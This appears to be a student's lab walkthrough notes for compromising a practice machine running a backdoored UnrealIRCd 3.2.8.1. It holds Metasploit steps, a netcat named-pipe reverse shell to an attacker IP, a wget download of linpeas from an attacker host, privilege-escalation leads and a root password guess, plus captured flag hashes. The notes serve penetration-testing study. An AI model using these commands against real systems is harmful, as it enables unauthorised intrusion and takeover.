I find that there is only 3 open ports and all of them are UnrealRCd.

https://computersecuritystudent.com/SECURITY_TOOLS/METASPLOITABLE/EXPLOIT/lesson7/index.html

What UnrealRCd?

- UnrealIRCd is an open source IRC daemon, originally based on DreamForge, and is available for Unix-like operating systems and Windows. Since the beginning of development on UnrealIRCd circa May 1999, many new features have been added and modified, including advanced security features and bug fixes, and it has become a popular server.

exploit/unix/irc/unreal_ircd_3281_backdoor

- This module exploits a malicious backdoor that was added to the Unreal IRCD 3.2.8.1 download archive. This backdoor was present in the Unreal3.2.8.1.tar.gz archive between November 2009 and June 12th 2010.

Open msfconsole

```php
msfconsole
```

Search for the service

```php
search unreal
```

exploit/unix/irc/unreal_ircd_3281_backdoor
UnrealIRCD 3.2.8.1 Backdoor Command Execution

Use exploit

```php
use 5
```

Show options

```php
options
```

Set Options
- RPORT - TARGET Port
- RHOST - TARGET IP

Set Payload

```php
show payloads
```

```php
set payload cmd/unix/bind_perl
```
- Unsure of which payload is best to use here

```php
run
```

Start a revers shell

```php
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.158 38888 >/tmp/f
```

```php
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- **Instructions**:
    1. exploit -z
    2. sessions -l
        - list sessions
    3. sessions -i 1
        - interact with sessions

```php
cat /home/server/local.txt
```

e2863ee56da7100df9734dbc788c3c01

![[Pasted image 20240918042632.png]]

```php
cd /dev/shm
```

```php
mkdir .z0d
```

```php
cd.z0d
```

upload linpas

```php
wget <ATTACKER_IP>/linpeas.sh
```

Highly probable:
`[CVE-2019-13272]` PTRACE_TRACEME

Linux version 4.19.0-10-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.132-1 (2020-07-24)

![[Pasted image 20240918044253.png]]

@reboot /home/server/irc/Unreal3.2/unreal start

 https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                                           
ptrace protection is disabled (0), so sudo tokens could be abused

Interesting writable files owned by me or writable by everyone
/home/server

Writable: /home/server/irc/Unreal3.2/config.log 
Writable: /home/server/irc/Unreal3.2/ircd.log

Password attack on the roor user:
- password
- Password123
- root

![[Pasted image 20240918051743.png]]

user: root
pass: root

36f7456d090c6aff72ad23a7dc9b465e

---

What i learned:
- Always check for weak passwords against users, including root.


